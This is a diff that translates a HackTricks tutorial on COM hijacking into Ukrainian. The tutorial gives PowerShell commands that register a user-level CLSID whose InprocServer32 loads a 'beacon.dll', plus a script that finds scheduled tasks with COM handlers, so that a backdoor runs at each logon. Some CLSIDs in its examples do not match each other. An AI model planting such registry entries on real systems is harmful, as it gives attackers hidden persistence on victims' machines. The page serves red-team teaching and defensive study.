@@ -1,72 +1,69 @@
-# COM Hijacking
+# Захоплення COM
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+Інші способи підтримки HackTricks:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Якщо ви хочете побачити свою **компанію в рекламі HackTricks** або **завантажити HackTricks у форматі PDF**, перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
+* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
+* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
+* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Поділіться своїми хакерськими трюками, надсилайте PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) **і** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **репозиторіїв на GitHub**.
 
 </details>
 
-### Searching not existent COM components
+### Пошук неіснуючих компонентів COM
 
-As the values of HKCU can be modified by the users **COM Hijacking** could be used as a **persistent mechanisms**. Using `procmon` it's easy to find searched COM registries that doesn't exist that an attacker could create to persist. Filters:
+Оскільки значення HKCU можуть бути змінені користувачами, **Захоплення COM** може бути використане як **постійний механізм**. За допомогою `procmon` легко знайти шукані реєстри COM, яких не існує, які зловмисник може створити для постійності. Фільтри:
 
-* **RegOpenKey** operations.
-* where the _Result_ is **NAME NOT FOUND**.
-* and the _Path_ ends with **InprocServer32**.
+* Операції **RegOpenKey**.
+* де _Результат_ - **NAME NOT FOUND**.
+* і _Шлях_ закінчується на **InprocServer32**.
 
-Once you have decided which not existent COM to impersonate execute the following commands. _Be careful if you decide to impersonate a COM that is loaded every few seconds as that could be overkill._&#x20;
-
+Після того, як ви вирішили, який неіснуючий COM імітувати, виконайте наступні команди. _Будьте обережні, якщо ви вирішили імітувати COM, який завантажується кожні кілька секунд, оскільки це може бути зайвим._&#x20;
 ```bash
 New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
 New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
 New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
 ```
+### Вразливі компоненти COM планувальника завдань, які можна перехопити
 
-### Hijackable Task Scheduler COM components
+Завдання Windows використовують власні тригери для виклику об'єктів COM, і оскільки вони виконуються через Планувальник завдань, легше передбачити, коли вони будуть запущені.
 
-Windows Tasks use Custom Triggers to call COM objects and because they're executed through the Task Scheduler, it's easier to predict when they're gonna be triggered.
-
-<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
+<pre class="language-powershell"><code class="lang-powershell"># Показати COM CLSIDs
 $Tasks = Get-ScheduledTask
 
 foreach ($Task in $Tasks)
 {
-  if ($Task.Actions.ClassId -ne $null)
-  {
-    if ($Task.Triggers.Enabled -eq $true)
-    {
-      $usersSid = "S-1-5-32-545"
-      $usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }
+if ($Task.Actions.ClassId -ne $null)
+{
+if ($Task.Triggers.Enabled -eq $true)
+{
+$usersSid = "S-1-5-32-545"
+$usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }
 
-      if ($Task.Principal.GroupId -eq $usersGroup)
-      {
-        Write-Host "Task Name: " $Task.TaskName
-        Write-Host "Task Path: " $Task.TaskPath
-        Write-Host "CLSID: " $Task.Actions.ClassId
-        Write-Host
-      }
-    }
-  }
+if ($Task.Principal.GroupId -eq $usersGroup)
+{
+Write-Host "Ім'я завдання: " $Task.TaskName
+Write-Host "Шлях завдання: " $Task.TaskPath
+Write-Host "CLSID: " $Task.Actions.ClassId
+Write-Host
+}
+}
+}
 }
 
-# Sample Output:
-<strong># Task Name:  Example
-</strong># Task Path:  \Microsoft\Windows\Example\
+# Приклад виводу:
+<strong># Ім'я завдання:  Приклад
+</strong># Шлях завдання:  \Microsoft\Windows\Example\
 # CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
-# [more like the previous one...]</code></pre>
+# [більше подібного до попереднього...]</code></pre>
 
-Checking the output you can select one that is going to be executed **every time a user logs in** for example.
+Перевіривши вивід, ви можете вибрати той, який буде виконуватися **кожного разу, коли користувач увійде в систему**, наприклад.
 
-Now searching for the CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** in **HKEY\_**_**CLASSES\_**_**ROOT\CLSID** and in HKLM and HKCU, you usually will find that the value doesn't exist in HKCU.
-
+Тепер, шукаючи CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** в **HKEY\_**_**CLASSES\_**_**ROOT\CLSID** та в HKLM та HKCU, зазвичай ви побачите, що значення не існує в HKCU.
 ```bash
 # Exists in HKCR\CLSID\
 Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"
@@ -74,7 +71,7 @@ Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}
 Name           Property
 ----           --------
 InprocServer32 (default)      : C:\Windows\system32\some.dll
-               ThreadingModel : Both
+ThreadingModel : Both
 
 # Exists in HKLM
 Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize
@@ -87,19 +84,18 @@ Name                                   Property
 PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
 Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
 ```
-
-Then, you can just create the HKCU entry and everytime the user logs in, your backdoor will be fired.
+Потім ви можете просто створити запис HKCU, і кожного разу, коли користувач увійде в систему, ваш backdoor буде запущений.
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+Інші способи підтримки HackTricks:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Якщо ви хочете побачити свою **компанію в рекламі на HackTricks** або **завантажити HackTricks у форматі PDF**, перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
+* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
+* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
+* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Поділіться своїми хакерськими трюками, надсилайте PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) **і** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **репозиторіїв на GitHub**.
 
 </details>
